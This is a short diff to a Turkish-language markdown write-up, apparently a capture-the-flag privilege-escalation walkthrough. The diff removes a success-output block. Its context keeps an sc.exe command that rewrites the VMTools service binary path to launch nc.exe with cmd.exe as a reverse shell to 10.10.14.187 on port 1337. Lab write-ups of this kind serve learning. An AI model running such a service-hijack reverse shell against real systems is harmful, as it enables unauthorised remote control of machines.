@@ -183,10 +183,6 @@ Daha sonra `VMTools` servisinin çalıştırdığı binary path'i kendi executab
 sc.exe config VMTools binPath="C:\Users\\svc-printer\\Documents\\nc.exe -e cmd.exe 10.10.14.187 1337"
 ```
 
-```text
-[SC] ChangeServiceConfig SUCCESS
-```
-
 <img width="1183" height="184" alt="privesc8" src="https://github.com/user-attachments/assets/049d1224-316e-41f7-b297-f7012ce4731f" />
 
 
